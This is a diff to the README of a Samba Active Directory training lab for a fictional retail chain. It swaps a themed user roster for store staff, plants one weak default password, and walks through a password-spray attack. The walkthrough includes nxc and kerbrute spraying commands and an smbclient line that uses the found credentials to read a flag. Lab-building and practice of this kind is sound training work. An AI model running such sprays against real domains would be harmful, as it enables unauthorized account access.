@@ -2,10 +2,11 @@
 
 A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
 [`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
-**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It seeds a themed roster of domain users and
-disables account lockout. Every password satisfies the policy, but exactly one account
-(`samwell.tarly`) reuses a weak seasonal word (`Autumn2024`); the rest are strong and random. The
-flag lives in a `nightswatch` share that only `samwell.tarly` may read.
+**SUMMIT.LAB** (Summit Retail Group, a retail chain) — no Windows VMs. It seeds a roster of
+store-staff domain users and disables account lockout. Every password satisfies the policy, but
+exactly one account (`k.verma`, a store manager) still uses the weak onboarding default
+(`Summer2024`); the rest are strong and random. The flag lives in a `storeops` share that only
+`k.verma` may read.
 
 | Machine | Service |
 | --- | --- |
@@ -14,14 +15,14 @@ flag lives in a `nightswatch` share that only `samwell.tarly` may read.
 ## The attack
 
 1. Take the user roster (given below, or enumerate it over null/low-priv LDAP on 389):
-   `eddard.stark, catelyn.stark, robb.stark, sansa.stark, arya.stark, brandon.stark, jon.snow,
-   samwell.tarly, jeor.mormont, benjen.stark, theon.greyjoy, maester.luwin`.
-2. Spray a short list of seasonal candidates (`Spring2024`, `Summer2024`, `Autumn2024`,
+   `m.oulton, s.datta, r.novak, t.bako, e.schmidt, l.moreau, d.nguyen, k.verma, a.kowalski,
+   p.ellison, j.ferreira, c.okafor`.
+2. Spray a short list of common candidates (`Spring2024`, `Summer2024`, `Autumn2024`,
    `Winter2023`, …) across the whole roster — one password at a time, every user — from the
    attack box. Lockout is off, so it is safe:
-   `nxc smb <dc> -u users.txt -p 'Autumn2024' --continue-on-success` (or `kerbrute passwordspray`).
-3. Exactly one account authenticates: `samwell.tarly` / `Autumn2024`.
-4. Read the flag with it: `smbclient //dc/nightswatch -U 'NORTH\samwell.tarly%Autumn2024' -c 'get flag.txt'`.
+   `nxc smb <dc> -u users.txt -p 'Summer2024' --continue-on-success` (or `kerbrute passwordspray`).
+3. Exactly one account authenticates: `k.verma` / `Summer2024`.
+4. Read the flag with it: `smbclient //dc/storeops -U 'SUMMIT\k.verma%Summer2024' -c 'get flag.txt'`.
 
 ## Run it
 
